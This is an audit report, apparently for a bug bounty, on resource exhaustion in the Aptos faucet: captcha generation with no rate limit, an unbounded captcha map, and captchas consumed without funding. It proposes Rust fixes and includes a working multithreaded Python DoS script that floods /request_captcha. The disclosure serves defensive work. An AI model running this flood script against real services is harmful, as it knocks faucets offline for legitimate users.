# Audit Report

## Title
Faucet Service Resource Exhaustion via Unlimited Captcha Generation and Consumption Without Funding Completion

## Summary
The Aptos faucet service contains multiple resource exhaustion vulnerabilities that allow attackers to trigger expensive operations (captcha generation, Redis queries) without completing funding. The `/request_captcha` endpoint has no rate limiting, allowing unlimited CPU-intensive captcha generation and unbounded memory growth. Additionally, the checker architecture allows captchas to be consumed and rate limit counters to be incremented even when funding never completes due to later checker rejections.

## Finding Description

The faucet's checker system has a fundamental resource management flaw. Checkers are sorted by cost and executed sequentially, but there is no rollback mechanism when expensive operations complete successfully but later checkers reject the request. [1](#0-0) 

**Vulnerability 1: Unlimited Captcha Generation DoS**

The `/request_captcha` endpoint has no rate limiting whatsoever, allowing attackers to spam expensive captcha generation operations: [2](#0-1) 

Each captcha generation applies multiple computationally expensive filters: [3](#0-2) 

Generated captchas are stored in an unbounded HashMap with no eviction policy: [4](#0-3) 

The code itself acknowledges this attack vector: [5](#0-4) 

**Vulnerability 2: Captcha Consumption Without Funding**

When a captcha is solved correctly, `TapCaptchaChecker` (cost 3) removes it from memory: [6](#0-5) 

However, later checkers like `MemoryRatelimitChecker` (cost 20) or `RedisRatelimitChecker` (cost 100) can still reject: [7](#0-6) 

When rejection occurs, `preprocess_request` returns an error before funding: [8](#0-7) 

The `fund_inner` function exits immediately, never reaching the `complete()` calls: [9](#0-8) 

**Attack Execution:**

1. **Captcha Generation Spam**: Attacker sends unlimited GET requests to `/request_captcha`
   - Each request generates captcha with 5 expensive filters (Noise, Wave, Grid, Dots)
   - Captchas accumulate in unbounded HashMap
   - Eventually causes OOM and service crash

2. **Captcha Waste Attack**: Attacker requests N captchas, solves them correctly, then:
   - Sends fund requests with correct captcha solutions
   - `TapCaptchaChecker` passes and removes captcha from memory
   - `MemoryRatelimitChecker` or `RedisRatelimitChecker` rejects
   - Server CPU spent generating captchas wasted
   - Legitimate users cannot get captchas (memory full)

## Impact Explanation

This qualifies as **Medium Severity** per Aptos bug bounty criteria:

- **Service Availability Impact**: Faucet service becomes unavailable, preventing legitimate users from obtaining testnet funds
- **Resource Exhaustion**: CPU exhaustion from captcha generation, memory exhaustion from unbounded HashMap
- **State Inconsistencies**: Captchas consumed without funding completion creates resource waste

While this doesn't directly impact the Aptos blockchain consensus or validator operations, the faucet is critical infrastructure for testnet/devnet operations. Complete faucet unavailability would halt onboarding and testing activities.

## Likelihood Explanation

**Very High Likelihood**:

- No authentication or rate limiting required for `/request_captcha` endpoint
- Attack requires only HTTP GET requests (trivial to execute)
- No computational cost to attacker (server bears all cost)
- Vulnerability explicitly acknowledged in code comments but remains unfixed
- Affects any faucet instance using `TapCaptchaChecker`

An unsophisticated attacker with a simple script can execute this attack in minutes.

## Recommendation

**Fix 1: Add Rate Limiting to Captcha Endpoint**

Implement IP-based rate limiting on the `/request_captcha` endpoint:

```rust
// In CaptchaApi
pub struct CaptchaApi {
    pub enabled: bool,
    pub captcha_manager: Arc<Mutex<CaptchaManager>>,
    pub captcha_rate_limiter: Arc<Mutex<LruCache<IpAddr, (u32, u64)>>>, // (count, timestamp)
}

async fn request_captcha(&self, source_ip: RealIp) -> Result<...> {
    // Rate limit: 5 captcha requests per IP per minute
    let ip = source_ip.0.ok_or(...)?;
    let mut limiter = self.captcha_rate_limiter.lock().await;
    let (count, last_reset) = limiter.get_or_insert_mut(ip, || (0, now()));
    if now() - *last_reset > 60 {
        *count = 0;
        *last_reset = now();
    }
    if *count >= 5 {
        return Err(AptosTapError::new("Captcha rate limit exceeded", ...));
    }
    *count += 1;
    // ... existing captcha generation ...
}
```

**Fix 2: Implement Captcha Eviction Policy**

Add TTL-based eviction to `CaptchaManager`:

```rust
pub struct CaptchaManager {
    challenges: HashMap<u32, (String, u64)>, // (value, timestamp)
}

impl CaptchaManager {
    const CAPTCHA_TTL_SECS: u64 = 300; // 5 minutes
    const MAX_CAPTCHAS: usize = 10000;
    
    pub fn evict_expired(&mut self, now: u64) {
        self.challenges.retain(|_, (_, ts)| now - *ts < Self::CAPTCHA_TTL_SECS);
        if self.challenges.len() > Self::MAX_CAPTCHAS {
            // Evict oldest entries
            let mut entries: Vec<_> = self.challenges.iter().collect();
            entries.sort_by_key(|(_, (_, ts))| *ts);
            for (k, _) in entries.iter().take(self.challenges.len() - Self::MAX_CAPTCHAS) {
                self.challenges.remove(*k);
            }
        }
    }
}
```

**Fix 3: Transactional Checker Execution**

For expensive checkers that modify state, delay modifications until all checkers pass:

```rust
// Add to CheckerTrait
async fn prepare(&self, data: CheckerData) -> Result<PrepareToken, AptosTapError> {
    // Check if request should be accepted, return token but don't modify state
}

async fn commit(&self, token: PrepareToken) -> Result<(), AptosTapError> {
    // Commit state changes (increment counters, remove captchas)
}

// In preprocess_request:
let mut tokens = Vec::new();
for checker in &self.checkers {
    tokens.push(checker.prepare(checker_data.clone()).await?);
}
// Only commit if all checks passed
for (checker, token) in checkers.iter().zip(tokens) {
    checker.commit(token).await?;
}
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
DoS PoC: Exhaust faucet resources via captcha generation spam
"""
import requests
import concurrent.futures
import time

FAUCET_URL = "http://localhost:8081"  # Adjust to target
THREADS = 50
REQUESTS_PER_THREAD = 1000

def spam_captcha_endpoint(thread_id):
    """Spam /request_captcha endpoint"""
    count = 0
    start = time.time()
    
    for i in range(REQUESTS_PER_THREAD):
        try:
            resp = requests.get(f"{FAUCET_URL}/request_captcha", timeout=5)
            if resp.status_code == 200:
                count += 1
                if count % 100 == 0:
                    print(f"[Thread {thread_id}] Generated {count} captchas")
        except Exception as e:
            print(f"[Thread {thread_id}] Error: {e}")
            return count
    
    elapsed = time.time() - start
    print(f"[Thread {thread_id}] Complete: {count} captchas in {elapsed:.2f}s")
    return count

def main():
    print(f"Starting DoS attack on {FAUCET_URL}")
    print(f"Using {THREADS} threads, {REQUESTS_PER_THREAD} requests each")
    print("Expected impact: CPU exhaustion, memory exhaustion, OOM crash\n")
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(spam_captcha_endpoint, i) for i in range(THREADS)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    total = sum(results)
    elapsed = time.time() - start_time
    
    print(f"\n=== Attack Complete ===")
    print(f"Total captchas generated: {total}")
    print(f"Total time: {elapsed:.2f}s")
    print(f"Rate: {total/elapsed:.2f} captchas/sec")
    print(f"Expected memory usage: ~{total * 5000} bytes (~{total * 5000 / 1024 / 1024:.2f} MB)")

if __name__ == "__main__":
    main()
```

**Expected Result**: After generating tens of thousands of captchas, the faucet service will experience:
- High CPU usage (>80%) from captcha generation with multiple filters
- Unbounded memory growth in `CaptchaManager::challenges` HashMap
- Eventually OOM kill or service degradation making faucet unusable
- Legitimate users unable to request captchas or fund accounts

### Citations

**File:** crates/aptos-faucet/core/src/server/run.rs (L141-143)
```rust
        // Sort Checkers by cost, where lower numbers is lower cost, and lower
        // cost Checkers are at the start of the vec.
        checkers.sort_by_key(|a| a.cost());
```

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L40-58)
```rust
    async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
        if !self.enabled {
            return Err(AptosTapError::new(
                "The CaptchaChecker is not enabled".to_string(),
                AptosTapErrorCode::EndpointNotEnabled,
            )
            .into());
        }
        let mut captcha_manager = self.captcha_manager.lock().await;
        let (key, image) = match captcha_manager.create_challenge() {
            Ok((key, image)) => (key, image),
            Err(e) => {
                return Err(
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError).into(),
                );
            },
        };
        Ok(Response::new(Binary(image)).header(CAPTCHA_KEY, key))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L126-131)
```rust
pub struct CaptchaManager {
    /// When a challenge is created, we return to the client the captcha itself
    /// and a random key they must make the second request with. This is a map
    /// from that random key to the value of the captcha.
    challenges: HashMap<u32, String>,
}
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L146-156)
```rust
        // Generate a captcha.
        let (name, image) = Captcha::new()
            .add_chars(5)
            .apply_filter(Noise::new(0.4))
            .apply_filter(Wave::new(4.0, 6.0).vertical())
            .apply_filter(Wave::new(3.0, 2.0).horizontal())
            .apply_filter(Grid::new(10, 6))
            .apply_filter(Dots::new(8))
            .as_tuple()
            .context("Failed to generate captcha")?;

```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L165-177)
```rust
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L77-88)
```rust
        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L272-278)
```rust
        if !rejection_reasons.is_empty() {
            return Err(AptosTapError::new(
                format!("Request rejected by {} checkers", rejection_reasons.len()),
                AptosTapErrorCode::Rejected,
            )
            .rejection_reasons(rejection_reasons));
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L332-347)
```rust
        if !bypass {
            let response_is_500 = match &fund_result {
                Ok(_) => false,
                Err(e) => e.error_code.status().is_server_error(),
            };
            let complete_data = CompleteData {
                checker_data,
                txn_hashes: txn_hashes.clone(),
                response_is_500,
            };
            for checker in &self.checkers {
                checker.complete(complete_data.clone()).await.map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError)
                })?;
            }
        }
```
